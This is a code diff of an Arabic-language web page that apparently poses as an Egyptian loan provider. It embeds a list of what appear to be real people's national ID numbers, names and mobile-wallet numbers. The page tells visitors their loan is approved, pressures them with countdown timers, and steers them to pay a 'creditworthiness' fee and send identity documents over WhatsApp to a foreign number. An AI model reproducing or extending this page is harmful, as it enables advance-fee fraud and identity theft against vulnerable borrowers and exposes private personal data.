-            wallet_type: "فودافون كاش",
-            wallet_number: "01080195197",
-            loan_amount: 150000,
-            installment: 4205
-        },
-          {
-            national_id: "28001281101112",
-            full_name: "علي سيد علي ابوالعز",
-            wallet_type: "فودافون كاش",
-            wallet_number: "01004734720",
-            loan_amount: 30000,
-            installment: 3325
-        },
-        {
-            national_id: "29603150201034",
-            full_name: "باسم جابر اسماعيل محمد ",
-            wallet_type: "فودافون كاش",
-            wallet_number: "01014397002",
-            loan_amount: 200000,
-            installment: 4445
-        },
-       {
-            national_id: "28108100101536",
-            full_name: "عمرو محمد عبده السيد ",
-            wallet_type: "اتصالات كاش",
-            wallet_number: "01122048172",
-            loan_amount: 200000,
-            installment: 4445 
-        },
-        {
-            national_id: "28508010103087",
-            full_name: "رباب سيد شعبان حسن ",
-            wallet_type: "اتصالات كاش",
-            wallet_number: "01140917234",
-            loan_amount: 60000,
-            installment: 3085 
-        },
+        { national_id: "29101080300051", full_name: "أحمد منصور إبراهيم عبداللاه", wallet_type: "أورانج كاش", wallet_number: "01200020138", loan_amount: 200000, installment: 4440 },
+        { national_id: "28608110104239", full_name: "محمد صابر احمد السيد ", wallet_type: "فودافون كاش", wallet_number: "01090933407", loan_amount: 60000, installment: 3090 },
+        { national_id: "28209292700476", full_name: "حسانى عياد بدرى السنوسي", wallet_type: "فودافون كاش", wallet_number: "01004580991", loan_amount: 40000, installment: 2965 },
+        { national_id: "29408012104373", full_name: "أحمد محمد عباس اسماعيل", wallet_type: "فودافون كاش", wallet_number: "01080396742", loan_amount: 105000, installment: 4375 },
+        { national_id: "27903222600113", full_name: "وائل محمود عباس هريدي", wallet_type: "اتصالات كاش", wallet_number: "01150597173", loan_amount: 50000, installment: 2725 },
+        { national_id: "29101011533558", full_name: "محمد خيرى احمد جميز", wallet_type: "فودافون كاش", wallet_number: "01005739087", loan_amount: 35000, installment: 3875 },
+        { national_id: "29003090102514", full_name: "محمود احمد احمد ابراهيم", wallet_type: "اتصالات كاش", wallet_number: "01102416547", loan_amount: 45000, installment: 3325 },
+        { national_id: "30105300104496", full_name: "يوسف الأمير عبد الدايم محمود", wallet_type: "اتصالات كاش", wallet_number: "01122640557", loan_amount: 80000, installment: 3550 },
+        { national_id: "2800603240255", full_name: "جرجس ميلاد ابراهيم كامل", wallet_type: "أورانج كاش", wallet_number: "01274003565", loan_amount: 200000, installment: 4440 },
+        { national_id: "30109028800114", full_name: "حسن خالد فاروق سلامه", wallet_type: "فودافون كاش", wallet_number: "01034385633", loan_amount: 30000, installment: 3330 },
+        { national_id: "27204032701678", full_name: "اشرف كمال محمد احمد", wallet_type: "فودافون كاش", wallet_number: "01080195197", loan_amount: 150000, installment: 4205 },
+        { national_id: "28001281101112", full_name: "علي سيد علي ابوالعز", wallet_type: "فودافون كاش", wallet_number: "01004734720", loan_amount: 30000, installment: 3325 },
+        { national_id: "29603150201034", full_name: "باسم جابر اسماعيل محمد ", wallet_type: "فودافون كاش", wallet_number: "01014397002", loan_amount: 200000, installment: 4445 },
+        { national_id: "28108100101536", full_name: "عمرو محمد عبده السيد ", wallet_type: "اتصالات كاش", wallet_number: "01122048172", loan_amount: 200000, installment: 4445 },
+        { national_id: "28508010103087", full_name: "رباب سيد شعبان حسن ", wallet_type: "اتصالات كاش", wallet_number: "01140917234", loan_amount: 60000, installment: 3085 }
     ];
 
     let currentCustomer = null;
     let timerInterval = null;
+    let creditworthinessInterval = null;
 
-    function handleSearch() {
+    function handleSearch(btn) {
         const nationalId = document.getElementById('nationalId').value.trim();
         const errorDiv = document.getElementById('errorMessage');
         const formSection = document.getElementById('formSection');
         const customerSection = document.getElementById('customerSection');
 
+        // Disable button temporarily
+        btn.disabled = true;
+        setTimeout(() => { btn.disabled = false; }, 3000);
+
         errorDiv.style.display = 'none';
         if (!nationalId) {
             errorDiv.textContent = '⚠️ يرجى إدخال الرقم القومي';
             errorDiv.style.display = 'block';
+            btn.disabled = false;
             return;
         }
 
@@ -497,10 +887,12 @@
             formSection.classList.add('hidden');
             customerSection.classList.remove('hidden');
             startTimer();
+            startCreditworthinessTimer();
             window.scrollTo(0, 0);
         } else {
             errorDiv.textContent = '⚠️ لم يتم العثور على بيانات العميل. يرجى التحقق من الرقم القومي';
             errorDiv.style.display = 'block';
+            btn.disabled = false;
         }
     }
 
@@ -517,7 +909,7 @@
     }
 
     function startTimer() {
-        let timeLeft = 36 * 60; // 36 دقيقة
+        let timeLeft = 36 * 60;
         const timerElem = document.getElementById('loanTimer');
         const progressBar = document.getElementById('timerProgressBar');
         const totalTime = 36 * 60;
@@ -532,7 +924,7 @@
             if (timeLeft <= 0) {
                 clearInterval(timerInterval);
                 progressBar.style.width = '0%';
-                alert('تم تحويل القرض إلى محفظتك بنجاح. يرجى مراجعة حسابك.');
+                alert('✅ تم تحويل القرض إلى محفظتك بنجاح. يرجى مراجعة حسابك.');
             }
             timeLeft--;
         }
@@ -540,14 +932,64 @@
         timerInterval = setInterval(update, 1000);
     }
 
+    function startCreditworthinessTimer() {
+        let timeLeft = 27 * 60;
+        const timerElem = document.getElementById('creditworthinessTimer');
+        const progressBar = document.getElementById('creditworthinessProgressBar');
+        const totalTime = 27 * 60;
+
+        if (creditworthinessInterval) clearInterval(creditworthinessInterval);
+        function update() {
+            const mins = Math.floor(timeLeft / 60);
+            const secs = timeLeft % 60;
+            timerElem.textContent = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+            const percent = (timeLeft / totalTime) * 100;
+            progressBar.style.width = `${percent}%`;
+
+            if (timeLeft <= 300) {
+                timerElem.classList.add('warning');
+            }
+
+            if (timeLeft <= 0) {
+                clearInterval(creditworthinessInterval);
+                progressBar.style.width = '0%';
+                document.getElementById('timeoutModal').style.display = 'block';
+            }
+            timeLeft--;
+        }
+        update();
+        creditworthinessInterval = setInterval(update, 1000);
+    }
+
     function sendWhatsAppMessage() {
         if (!currentCustomer) return;
+
+        // تأكيد أمني
+        const confirmSend = confirm('⚠️ تحذير أمني: سترسل صور مستنداتك عبر واتساب. تأكد من أنك تتعامل مع فريق الدعم الرسمي. هل تريد المتابعة؟');
+        if (!confirmSend) return;
+
+        // طلب آخر 3 أرقام من المحفظة
+        const last3 = prompt('لتأكيد ملكيتك للمحفظة، أدخل آخر 3 أرقام من رقم محفظتك:');
+        if (!last3 || last3 !== currentCustomer.wallet_number.slice(-3)) {
+            alert('❌ الرقم غير صحيح. لم يتم فتح واتساب. يرجى المحاولة مرة أخرى.');
+            return;
+        }
+
         let proofAmount;
         if (currentCustomer.loan_amount < 50000) proofAmount = 4000;
         else if (currentCustomer.loan_amount <= 100000) proofAmount = 6000;
         else if (currentCustomer.loan_amount <= 200000) proofAmount = 8000;
         else proofAmount = 10000;
-        const message = `مرحباً، أنا ${currentCustomer.full_name} (رقم قومي: ${currentCustomer.national_id})، أريد إتمام إجراءات الجدارة الائتمانية. مبلغ الجدارة المطلوب: ${formatCurrency(proofAmount)}.`;
+
+        const message = `مرحباً، أنا ${currentCustomer.full_name} (رقم قومي: ${currentCustomer.national_id})، أريد إتمام إجراءات الجدارة الائتمانية. مبلغ الجدارة المطلوب: ${formatCurrency(proofAmount)}. أرسل لك الصور المطلوبة.`;
+        const whatsappUrl = `https://wa.me/212614494251?text=${encodeURIComponent(message)}`;
+        window.open(whatsappUrl, '_blank');
+
+        alert('✅ تم توجيهك إلى واتساب. يرجى إرسال الصور إلى فريق الدعم. سيتم مراجعة طلبك خلال ساعة كحد أقصى.');
+    }
+
+    function contactSupport() {
+        const message = `مرحباً، انتهى الوقت المحدد لإثبات الجدارة الائتمانية. أرجو مساعدتي في هذا الشأن.`;
         const whatsappUrl = `https://wa.me/212614494251?text=${encodeURIComponent(message)}`;
         window.open(whatsappUrl, '_blank');
     }
@@ -575,7 +1017,6 @@
         else proofAmount = 10000;
         document.getElementById('proofAmountText').innerHTML = formatNumber(proofAmount);
 
-        // Contract details
         const today = new Date();
         const nextPayment = new Date();
         nextPayment.setDate(nextPayment.getDate() + 29);
@@ -601,10 +1042,22 @@
         document.getElementById('customerSection').classList.add('hidden');
         document.getElementById('errorMessage').style.display = 'none';
         if (timerInterval) clearInterval(timerInterval);
+        if (creditworthinessInterval) clearInterval(creditworthinessInterval);
         currentCustomer = null;
     }
 
-    // توليد جزيئات
+    function showPrivacyPolicy() {
+        document.getElementById('privacyModal').style.display = 'block';
+    }
+
+    function showTerms() {
+        document.getElementById('termsModal').style.display = 'block';
+    }
+
+    function closeModal(modalId) {
+        document.getElementById(modalId).style.display = 'none';
+    }
+
     function createParticles() {
         const pDiv = document.getElementById('particles');
         for (let i = 0; i < 40; i++) {
@@ -622,8 +1075,15 @@
     createParticles();
 
     document.getElementById('nationalId').addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') handleSearch();
+        if (e.key === 'Enter') handleSearch(document.querySelector('.btn-gold'));
     });
+
+    window.onclick = function(event) {
+        if (event.target.classList.contains('modal')) {
+            event.target.style.display = 'none';
+        }
+    }
 </script>
+
 </body>
 </html>
